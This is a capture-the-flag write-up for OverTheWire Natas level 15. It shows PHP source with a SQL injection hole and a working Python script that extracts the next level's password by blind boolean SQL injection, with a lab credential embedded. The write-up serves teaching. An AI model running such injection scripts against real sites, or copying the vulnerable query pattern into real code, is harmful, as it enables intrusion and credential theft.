# level 15

**Host**: http://natas15.natas.labs.overthewire.org
>natas15:SdqIqBsFcz3yotlNYErZSZ**********

When you visit the site, you will be prompted for a username

```
Username:
```

### Solution:

When you click on the "View source" link you get following php code:

```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
```

Again we have a SQLi vulnerability in this code. With the payload `username="natas16" and password LIKE "%a%"`, you can find out whether the password for natas16 contains an `a`. You can repeat this character by character until you have all the characters it contains. To find the correct order, you have to adjust the payload to `username=natas16" and password LIKE BINARY "%a%`. Since it takes a long time and is cumbersome to try character by character, it makes sense to write a Python script to automate the process.

```python
#!/usr/bin/env python3

import string
import requests
from requests.auth import HTTPBasicAuth

CHARSET = string.ascii_letters + string.digits

def main():
    password = ''
    chars_unsorted = ''
    auth = HTTPBasicAuth('natas15', 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx')


    for c in CHARSET:
        url = 'http://natas15.natas.labs.overthewire.org/index.php?debug=1&&username=natas16" and password LIKE "%' + c + '%'
        r = requests.get(url, auth=auth)
        if 'This user exist' in r.text:
            chars_unsorted += c

    for i in range(0, 32):
        for c in chars_unsorted:
            url = 'http://natas15.natas.labs.overthewire.org/index.php?debug=1&&username=natas16" and password LIKE BINARY"' + password + c + '%'
            r = requests.get(url, auth=auth)
            if 'This user exist' in r.text:
                password += c
                break

    print(f'Natas16 password: {password}')

if __name__ == '__main__':
    main()
```

Since there is no feedback built in this script you can run wireshark and filter for http to watch the progress or proxy it trought burpsuit.

```shell
$ ./exploit.py
Natas16 password: hPkjKYviLQctEW33QmuXL6**********
```